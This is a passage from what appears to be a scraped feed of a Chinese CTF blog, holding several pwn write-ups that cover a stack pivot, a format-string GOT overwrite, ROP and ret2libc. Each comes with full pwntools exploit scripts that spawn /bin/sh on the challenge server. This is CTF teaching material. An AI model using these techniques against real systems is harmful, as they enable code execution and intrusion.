ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... backdoor = 0x400E88 sendline_after_clean(\u0026#34;admin\u0026#34;) payload = flat([ \u0026#34;2jctf_pa5sw0rd\u0026#34;.ljust(0x60-0x18, \u0026#34;\\x00\u0026#34;), backdoor ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/c++pwnzjctf-2019login/","section":"writeup","summary":"Our shared values define us more than our differences. And acknowledging those shared values can see us through our challenges today if we have the wisdom to trust in them again. — John McCain 原题链接 查看程序架构 ida伪代码 典型的C++语法，这里应该有两个类，Admin继承","tags":["pwn","C++Pwn"],"title":"【C++Pwn】[ZJCTF 2019]Login"},{"categories":["writeup"],"contents":" If you change the way you look at things, the things you look at change. — Wayne Dyer\n原题链接\n查看程序架构 ida伪代码 限制溢出的字符到ret只能有一个地址，没有后门函数，典型栈迁移\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./ciscn_s_4\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25030\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x28 backdoor = m_elf.sym[\u0026#39;hack\u0026#39;] payload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; send_after_clean(payload, no_show=True) buf = recv_and_transform(\u0026#34;b\u0026#34;) - 0x38 leave_ret = 0x08048562 call_system = 0x8048559 payload = flat([ 0, call_system, buf + 4*3, \u0026#34;/bin/sh\\x00\u0026#34; ]).ljust(0x28, b\u0026#34;\\x00\u0026#34;) payload += flat([ buf, leave_ret ]) sendline_after_clean(payload, no_show=True) interactive_after_clean(no_show=True) 其中，因为call会自动将下一条指令入栈，所以就不用在栈中空出一位给ret了，buf+4*3的位置会被调整为esp+8\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/","section":"writeup","summary":"If you change the way you look at things, the things you look at change. — Wayne Dyer 原题链接 查看程序架构 ida伪代码 限制溢出的字符到ret只能有一个地址，没有后门函数，典型栈迁移 exp # 自动生成头部 from pwn","tags":["pwn","32位系统call","栈迁移"],"title":"【call32】【栈迁移】BUUCTF ciscn_2019_s_4"},{"categories":["writeup"],"contents":" I have an everyday religion that works for me. Love yourself first, and everything else falls into line. — Lucille Ball\n【Write-up】BUUCTF others_shellcode 原题链接\n【Write-up】BUUCTF others_shellcode checksec 查看程序架构 ida 查看程序伪代码 构建 exp checksec 查看程序架构 $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ida 查看程序伪代码 然后我们看到它的getShell函数：\n我们看到它里面有一句很奇怪的__asm { int 80h; LINUX - sys_execve }，这是干什么的？\n我们按 tab 看一下它对应的汇编代码：\n这里我们已经看出一点端倪了，没错，这一句就是内联汇编（内联汇编使用“__asm”（C++）和“asm”（C 和 C++）关键字声明）\n具体可以看以下推文：\nMIPS 指令集：内嵌汇编 asm 语法介绍 C 语言内嵌汇编**asm__**volatile__ C 语言 ASM 汇编内嵌语法 至于int 80的作用，请参考我写的这篇 writeup的第二个 exp\n构建 exp 这题根本不需要 exp，直接nc 网址 端口号即可，程序会自动执行execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\n这题的主要功能就是介绍int 80的作用还有内联汇编\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/","section":"writeup","summary":"I have an everyday religion that works for me. Love yourself first, and everything else falls into line. — Lucille Ball 【Write-up】BUUCTF others_shellcode 原题链接 【Write-up】BUUCTF others_shellcode checksec 查看程序架构 ida 查看程序伪代码 构","tags":["pwn","C内嵌汇编"],"title":"【C内嵌汇编】others_shellcode"},{"categories":["writeup"],"contents":" Love is blind; friendship closes its eyes. — Friedrich Nietzsche\n查看程序架构 ida伪代码 典型的格式化字符串漏洞，我们gdb到printf(format);那里看下栈：\n可以看到格式化字符串在栈上储存要先吞掉一个字符才到第8个参数的位置\n我们也可以看到在第0x97个参数的位置存储了__libc_start_main+247的值，我们可以用其计算出libc的基址\n那么答案就很简单了，改写printf的got值为system即可\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./axb_2019_fmt32\u0026#34; libc_name:str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;25269\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... format_payload = b\u0026#34;%151$p\u0026#34; sendline_after_clean(format_payload) libcbase = recv_and_transform(\u0026#34;:\u0026#34;, False, False, \u0026#34;\\n\u0026#34;) - 247 - libc.sym[\u0026#39;__libc_start_main\u0026#39;] system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libcbase + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) one_gadget = libcbase + 0x3a80e suclog( libcbase=libcbase, system_addr=system_addr, binsh_addr=binsh_addr ) format_payload = b\u0026#34;a\u0026#34; + fmtstr_payload(8, {m_elf.got[\u0026#39;printf\u0026#39;]:one_gadget}, 10) sendline_after_clean(format_payload, no_show=False) sendline_after_clean(b\u0026#34;/bin/sh\u0026#34;) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/fmtstr_payload%E5%87%BD%E6%95%B0buuctf-axb_2019_fmt32/","section":"writeup","summary":"Love is blind; friendship closes its eyes. — Friedrich Nietzsche 查看程序架构 ida伪代码 典型的格式化字符串漏洞，我们gdb到printf(format);那里看下栈： 可以看到格式化字符串在栈上储","tags":["pwn","fmtstr_payload函数","格式化字符串"],"title":"【fmtstr_payload函数】BUUCTF axb_2019_fmt32"},{"categories":["writeup"],"contents":" We respect our elders. There is wisdom that comes from experience, and I am not going to stop learning from wise counsel. — Marcia Fudge\n原题链接\n【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop checksec 查看程序架构 ida 查看程序伪代码 gdb 调试 构建 exp 完整 exp checksec 查看程序架构 $ checksec --file babyrop [*] \u0026#39;/home/peterl/security/workspace/babyrop/babyrop\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 位程序，不能使用 shellcode\nida 查看程序伪代码 有 scanf，有 printf，看起来可能是普通的栈溢出，我们可以调试看看\n此题用不了格式化字符串漏洞，因为我们控制不了 format 字符串，只能控制后面跟的 args，而 printf 只会对 format 字符串作解析\ngdb 调试 这题比较坑的是第一条输出语句是system函数输出的，因此我们在 gdb 调试之前就要加一句set follow-fork-mode parent，这条命令将调试追踪固定在父程序上，不让他跑去追踪子程序\n我们通过 ida 找到call _printf的地址，使用b* 0x40060F打个断点，这时候如果直接 run 就需要输入了，所以我们先cyclic 50一个规律字符串用以输入\npwndbg\u0026gt; cyclic 50 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama 然后直接r\n然后我们看到栈情况是这样的：\n00:0000│ rsi rsp 0x7fffffffd770 ◂— \u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 01:0008│ 0x7fffffffd778 ◂— \u0026#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 02:0010│ rbp 0x7fffffffd780 ◂— \u0026#39;eaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 03:0018│ 0x7fffffffd788 ◂— \u0026#39;gaaahaaaiaaajaaakaaalaaama\u0026#39; 04:0020│ 0x7fffffffd790 ◂— \u0026#39;iaaajaaakaaalaaama\u0026#39; 05:0028│ 0x7fffffffd798 ◂— \u0026#39;kaaalaaama\u0026#39; 06:0030│ 0x7fffffffd7a0 ◂— 0x1ff00616d /* \u0026#39;ma\u0026#39; */ 作者此时心中一喜，连按n继续到ret指令，看一看此时rsp栈顶指针指向哪里\n我们发现 return 值可以被我们栈溢出掉，于是我们可以用cyclic -l gaaa来看一看偏移量是多少：\npwndbg\u0026gt; cyclic -l gaaa 24 同时当前程序 plt 表中肯定有system（前面调用过），我们只需要/bin/sh或者sh就能构建 exp 了！\n构建 exp 在 ida 中找到system的地址：\nROPgadget寻找/bin/sh：\n$ ROPgadget --binary babyrop --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000601048 : /bin/sh ROPgadget寻找pop rdi;ret和ret：\n$ ROPgadget --binary babyrop --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400683 : pop rdi ; ret ... 0x0000000000400479 : ret ... 那么我们的 payload 就出来了：\npop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) 完整 exp from pwn import * from pwn import p64, p32, u32, u64 import pwnlib # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyrop\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28069\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x40060F\u0026#34;) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) pop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 p.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) p.sendline(payload) # p.recvuntil(\u0026#34;!\\n\u0026#34;) p.interactive() 此题还有一个比较坑的点，它的 flag 并不是放在当前目录下，此题 flag 的位置在/home/babyrop内，可以通过find -name flag查找位置（动作快一点，有时间限制）\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/harekazectf2019baby_rop/","section":"writeup","summary":"We respect our elders. There is wisdom that comes from experience, and I am not going to stop learning from wise counsel. — Marcia Fudge 原题链接 【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop checksec 查看程序","tags":["pwn"],"title":"【HarekazeCTF2019】baby_rop"},{"categories":["writeup"],"contents":" Do you want to know who you are? Don\u0026rsquo;t ask. Act! Action will delineate and define you. — Thomas Jefferson\n原题链接和这道题是一道题，一模一样的\n【Write-up】BUUCTF ciscn_2019_en_2 checksec 查看程序架构 ida 查看程序伪代码 构建 exp 完整 exp checksec 查看程序架构 $ checksec --file ciscn_2019_en_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_en_2/ciscn_2019_en_2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 位程序，不能用 shellcode\n再用readelf命令看一下：\n$ readelf -r ciscn_2019_en_2 重定位节 \u0026#39;.rela.dyn\u0026#39; at offset 0x538 contains 4 entries: 偏移量 信息 类型 符号值 符号名称 + 加数 000000601ff8 000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000602080 000d00000005 R_X86_64_COPY 0000000000602080 stdout@GLIBC_2.2.5 + 0 000000602090 000e00000005 R_X86_64_COPY 0000000000602090 stdin@GLIBC_2.2.5 + 0 0000006020a0 000f00000005 R_X86_64_COPY 00000000006020a0 stderr@GLIBC_2.2.5 + 0 重定位节 \u0026#39;.rela.plt\u0026#39; at offset 0x598 contains 11 entries: 偏移量 信息 类型 符号值 符号名称 + 加数 000000602018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0 000000602020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000602028 000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0 000000602030 000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0 000000602038 000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000602040 000600000007 R_X86_64_JUMP_SLO 0000000000000000 getchar@GLIBC_2.2.5 + 0 000000602048 000700000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0 000000602050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0 000000602058 000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fflush@GLIBC_2.2.5 + 0 000000602060 000b00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0 000000602068 000c00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0 发现没有system，可能就是 ret2libc 了\nida 查看程序伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(\u0026#34;EEEEEEE hh iii \u0026#34;); puts(\u0026#34;EE mm mm mmmm aa aa cccc hh nn nnn eee \u0026#34;); puts(\u0026#34;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e \u0026#34;); puts(\u0026#34;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;====================================================================\u0026#34;); puts(\u0026#34;Welcome to this Encryption machine\\n\u0026#34;); begin(); while ( 1 ) { while ( 1 ) { fflush(0LL); v4 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); if ( v4 != 2 ) break; puts(\u0026#34;I think you can do it by yourself\u0026#34;); begin(); } if ( v4 == 3 ) { puts(\u0026#34;Bye!\u0026#34;); return 0; } if ( v4 != 1 ) break; encrypt(); begin(); } puts(\u0026#34;Something Wrong!\u0026#34;); return 0; } 这一大堆杂乱的代码我们花一点时间去分析就会发现，只有当第一次输入的选项是 1 的时候，才会进入encrypt函数，而这个函数的伪 C 代码为：\nint encrypt() { size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 \u0026gt;= strlen(s) ) break; if ( s[x] \u0026lt;= 96 || s[x] \u0026gt; 122 ) { if ( s[x] \u0026lt;= 64 || s[x] \u0026gt; 90 ) { if ( s[x] \u0026gt; 47 \u0026amp;\u0026amp; s[x] \u0026lt;= 57 ) s[x] ^= 0xCu; } else { s[x] ^= 0xDu; } } else { s[x] ^= 0xEu; } ++x; } puts(\u0026#34;Ciphertext\u0026#34;); return puts(s); } 这代码也是乱得不得了，和神经病发癫一样。但是其实那一大串while里面的代码都可以通过这一句来跳过去：\nv0 = (unsigned int)x; // v0 \u0026gt;= 0 if ( v0 \u0026gt;= strlen(s) ) break; 如果我们让s的第一个字符为\\0的话，那么它strlen后的值就始终为 0，v0始终大于等于s的长度，那么就能直接跳出循环，不用进行下面那一大串操作。\n我们又看到输入函数为gets，这说明可以栈溢出，同时程序又有puts函数，我们就能得到libc的基址，从而计算出system的真实地址\n构建 exp 先把ret和pop rdi;ret这两个 gadget 准备好：\n$ ROPgadget --binary ciscn_2019_en_2 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400c83 : pop rdi ; ret ... 0x00000000004006b9 : ret ... 也可以通过 pwntools 的内置函数得到：\nrop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] puts 的 plt 和 got 地址、main 的地址同理：\nputs_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] 然后我们可以构建第一个 payload 了：\n# offset:int = 0x58，可以由gdb或者ida得知 payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) 然后我们就能得到puts的真实地址了：\np.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) # 这里很奇怪，调试后发现多了一个0a，要把它吞掉 p.recv(1) # 得到真实地址 puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) 为了避免各种版本的 libc 影响，我们可以使用 LibcSearcher：\n# 计算得到基址和system地址 searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # 手动选择第0号搜索到的libc # 如果你选择0号不行，也可以把这行注释掉，运行中再选择 searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) 原版 LibcSearcher 已经年久失修，而且基于本地 libc 库，几乎完全不可用，GitHub 上有很多新版 LibcSearcher，我选择了这个使用云端 libc 库的项目\n作者为了使用正确的 libc 甚至重新搭了一个 ubuntu18.04 的虚拟机环境，但是在几个小时的忙碌后发现 libc 版本还是不对，于是转而选择 LibcSearcher，不得不说，是真**的好用，感谢原作者和后续无私奉献的开发者！\n然后我们可以构建 payload 了：\npayload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) 